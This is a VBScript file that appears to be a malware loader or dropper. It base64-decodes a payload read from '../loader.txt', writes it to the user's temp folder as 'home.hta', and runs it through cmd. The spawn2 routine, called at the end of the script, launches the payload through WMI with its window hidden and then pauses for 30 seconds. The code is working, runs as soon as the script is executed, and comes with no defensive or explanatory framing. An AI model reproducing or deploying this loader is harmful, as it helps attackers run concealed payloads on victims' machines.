Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    Base64Encode = oNode.text
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

'Stream_StringToBinary Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save text/string data.
  BinaryStream.Type = adTypeText

  'Specify charset For the source text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And write text/string data To the object
  BinaryStream.Open
  BinaryStream.WriteText Text

  'Change stream type To binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary

  'Ignore first two bytes - sign of
  BinaryStream.Position = 0

  'Open the stream And get binary data from the object
  Stream_StringToBinary = BinaryStream.Read

  Set BinaryStream = Nothing
End Function

'Stream_BinaryToString Function
'2003 Antonin Foller, http://www.motobit.com
'Binary - VT_UI1 | VT_ARRAY data To convert To a string 
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function writeFile (d,f)

    Set so = CreateObject("Scripting.FileSystemObject")
    
    Set OutPutFile = so.CreateTextFile(f,True)
    OutPutFile.WriteLine(d)
    OutPutFile.close

End Function

Function readFile (f)

    Set so = CreateObject("Scripting.FileSystemObject")

    Set file = so.OpenTextFile(f,1)
    readFile = file.ReadAll

End Function

Sub spawn
  set  ws = CreateObject("wscript.shell")
  str = readFile("../loader.txt")
  tmp = ws.ExpandEnvironmentStrings("%TEMP%")
  pth = tmp & "/home.hta"
  cmd = tmp & " && " & pth
  writeFile Base64Decode(str),pth
  ws.run("cmd /c cd " & cmd)
End sub

Sub spawn2
  Const HIDDEN_WINDOW = 1
  strComputer = "."
  Set  ws = CreateObject("wscript.shell")
  str = readFile("../loader.txt")
  tmp = ws.ExpandEnvironmentStrings("%TEMP%")
  pth = tmp & "/home.hta"
  writeFile Base64Decode(str),pth
  Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  Set objStartup = objWMIService.Get("Win32_ProcessStartup")
  Set objConfig = objStartup.SpawnInstance_
  objConfig.ShowWindow = HIDDEN_WINDOW
  Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
  cmd = "cmd /c cd " & tmp & " && " & pth
  result = objProcess.Create(cmd,tmp, objConfig, intProcessID)
  WScript.Echo "Method returned result = " & tmp
  WScript.Echo "Id of new process is " & intProcessID
  ws.run "Timeout /T 30 /nobreak" ,0 ,true

End sub

spawn2()